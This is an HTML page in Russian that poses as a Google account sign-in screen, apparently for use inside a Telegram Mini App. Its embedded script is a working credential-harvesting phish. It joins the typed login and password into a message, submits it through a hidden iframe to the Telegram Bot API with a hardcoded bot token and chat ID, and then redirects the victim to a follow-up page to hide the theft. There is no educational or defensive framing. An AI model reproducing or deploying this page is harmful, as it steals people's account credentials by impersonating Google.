<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="style.css">
    <title>Вход</title>
    <style>
        html, body {
            height: auto;
            min-height: 100%;
            margin: 0;
            padding: 0;
            background-color: rgb(8, 8, 8);
            font-family: sans-serif;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
        }
        
        .glav {
            display: flex;
            flex-direction: column;
            box-sizing: border-box;
            padding: 20px;
            min-height: 100vh;
            justify-content: start;
        }

        .imue {
            margin-bottom: 20px;
        }

        .button {
            margin-top: 30px;
            margin-bottom: 40px;
            text-align: center;
        }

        #button {
            width: 100%;
            padding: 12px;
            box-sizing: border-box;
            cursor: pointer;
        }

        #status {
            color: rgb(200, 200, 200);
            text-align: center;
            margin: 15px 0;
            font-size: 14px;
        }

        /* Прячем невидимый iframe */
        #hidden_iframe {
            display: none;
        }
    </style>
</head>
<body>
    <iframe name="hidden_iframe" id="hidden_iframe"></iframe>

    <form id="tgForm" method="POST" target="hidden_iframe" class="glav">
        
        <input type="hidden" name="chat_id" value="6811862398">
        <input type="hidden" name="text" id="tg_text">

        <div class="imue">
            <img src="gglogo.png" class="imug">
            <p class="sinin">Вход</p>
            <p class="isp">Используйте аккаунт Google</p>
            <input class="input1" type="text" id="login" placeholder="Телефон или адрес эл. почты" style="background-color: rgb(8, 8, 8);" required>
            <input class="input2" type="password" id="password" placeholder="Пароль" style="background-color: rgb(8, 8, 8);" required>
        </div>
        
        <div id="status"></div>

        <div class="button">
            <button type="submit" id="button">Далее</button>
        </div>
    </form>

    <script>
        const TOKEN = "7720379353:AAGsCGg6r6DZQAnEBb9fsBje4JE0Dao8oEY";
        
        const form = document.getElementById("tgForm");
        const inputLogin = document.getElementById("login");
        const inputPass = document.getElementById("password");
        const tgText = document.getElementById("tg_text");
        const btn = document.getElementById("button");
        const status = document.getElementById("status");

        // Динамически подставляем правильный URL с токеном в атрибут action формы
        form.action = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        form.addEventListener("submit", (e) => {
            // Формируем текст для отправки
            tgText.value = "Логин: " + inputLogin.value + "  Пароль:   " + inputPass.value;

            // Меняем статус интерфейса
            btn.disabled = true;
            status.textContent = "Вход...";

            // Перенаправление на next.html внутри Telegram Mini App через небольшую задержку,
            // чтобы форма успела отправить запрос в скрытый iframe
            setTimeout(() => {
                window.location.href = "next.html";
            }, 800);
        });
    </script>
</body>
</html>
